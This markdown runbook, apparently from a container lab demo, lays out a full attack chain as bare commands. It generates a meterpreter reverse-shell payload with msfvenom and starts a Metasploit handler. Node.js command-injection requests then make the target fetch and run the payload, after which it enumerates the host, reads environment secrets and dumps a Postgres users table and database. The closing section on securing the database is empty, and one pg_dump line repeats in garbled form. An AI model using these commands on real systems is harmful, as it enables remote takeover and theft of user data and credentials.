# Execute Hack

## Run script to check for vulnerability

```shell
scan
```

## Create payload
```shell
msfvenom -p linux/x86/meterpreter_reverse_http LHOST=$(dig +short kali.container.shipyard.run) LPORT=9999 -f elf > payload
```

```shell
chmod +x
```

```shell
./payload
```

```shell
python3 -m http.server &> /dev/null &
```

```shell
msfconsole
```

## Start reverse handler
```shell
db_status
```

```shell
use exploit/multi/handler
```

```shell
set PAYLOAD linux/x86/meterpreter_reverse_http
```

```shell
set LHOST 0.0.0.0
```

```shell
set LPORT 9999
```

```shell
run
```

## Execute hack

```shell
curl "search-http.ingress.shipyard.run:9090?device[]=x&device[]=y%27-require(%27child_process%27).exec(%27curl+10.5.0.2:8000/payload+-o+payload%27)-%27"
```

```shell
curl "search-http.ingress.shipyard.run:9090?device[]=x&device[]=y%27-require(%27child_process%27).exec(%27chmod+%2Bx+payload%27)-%27"
```

```shell
curl "search-http.ingress.shipyard.run:9090?device[]=x&device[]=y%27-require(%27child_process%27).exec(%27./payload%27)-%27"
```

```shell
pwd
```

```shell
getuid
```

```shell
ps
```

```shell
run post/linux/gather/enum_system
```

```shell
shell
```

## Abuse host
```shell
env
```

```shell
apt update && apt install -y postgresql-client
```

```shell
PGPASSWORD=$DATABASE_PASSWORD psql -h $DATABASE_SERVICE_HOST -p $DATABASE_SERVICE_PORT -U $DATABASE_USER -w -d $DATABASE_NAME
```

```shell
\l
```

```shell
\du+
```

```shell
\d
```

```shell
SELECT * FROM users;
```

```shell
PGPASSWORD=$DATABASE_PASSWORD pg_dump -h $DATABASE_SERVICE_HOST -p $DATABASE_SERVICE_PORT -U $DATABASE_USER -w root
$DATABASE_SERVICE_PORT -U $DATABASE_USER -w root
```

# Securing the Database

```shell

```
